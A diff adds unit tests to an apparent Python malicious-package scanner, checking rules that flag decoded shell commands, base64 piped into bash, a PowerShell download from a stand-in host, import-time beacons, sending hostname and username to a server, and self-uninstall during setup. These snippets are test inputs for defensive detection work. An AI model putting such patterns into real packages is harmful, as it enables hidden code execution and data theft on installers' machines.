@@ -290,3 +290,71 @@ def test_local_imports():
     assert local_imports("from main import main\nimport os\nimport a.b as c\nfrom . import x") \
         == {"main", "os", "a"}
     assert local_imports("print 'py2'") == set()
+
+
+# Tricks found in the older half of the malware samples.
+
+def test_decoded_shell_command():
+    found = scan("import os\nfrom base64 import b64decode as b64d\nos.system(b64d('Y3VybA=='))",
+                 role="setup")
+    hit = [f for f in found if f.rule == "exec-decoded"][0]
+    assert hit.critical and hit.message == "decodes a hidden command and runs it"
+
+
+def test_python_dash_c_with_decoded_code():
+    found = rules("import subprocess, base64, sys\n"
+                  "subprocess.Popen([sys.executable, '-c', base64.b64decode(cmd).decode()])")
+    assert "exec-decoded" in found
+
+
+def test_aliased_dangerous_functions_are_followed():
+    found = rules('''
+        import os
+        _ssystem = os.system
+        _ssystem("start pythonw.exe evil.py")
+    ''', role="setup")
+    assert "shell-at-install" in found
+
+
+def test_functions_called_at_the_top_level_run_on_import():
+    found = scan('''
+        import requests
+        def beacon():
+            requests.post("https://x.example/c", data={"x": 1})
+        def unused():
+            requests.get("https://x.example/other")
+        beacon()
+    ''', role="import")
+    hits = [f.line for f in found if f.rule == "network-at-install"]
+    assert hits == [4]
+
+
+def test_machine_details_sent_to_a_server():
+    found = scan('''
+        import requests, socket, getpass
+        info = {"host": socket.gethostname(), "user": getpass.getuser()}
+        def go():
+            requests.post("https://x.example/collect", json=info)
+    ''')
+    recon = [f for f in found if f.rule == "recon"]
+    assert recon and max(f.value for f in recon) == 25
+
+
+def test_self_uninstall_during_install():
+    found = rules("import os\nos.system('pip3 --verbose uninstall ' + NAME + ' -y')", role="setup")
+    assert "hides-traces" in found
+    assert "hides-traces" not in rules("print('run pip uninstall x to remove it')")
+
+
+def test_base64_piped_into_a_shell():
+    found = scan("import os\nos.system('echo %s|base64 -d|bash' % encoded)", role="setup")
+    assert any(f.rule == "exec-decoded" and f.critical for f in found)
+
+
+def test_powershell_download_built_on_another_line():
+    found = rules('''
+        import subprocess
+        download_command = "Invoke-WebRequest -Uri https://x.example/a.exe -OutFile a.exe"
+        subprocess.run(["powershell", "-Command", download_command])
+    ''', role="setup")
+    assert "hidden-powershell" in found
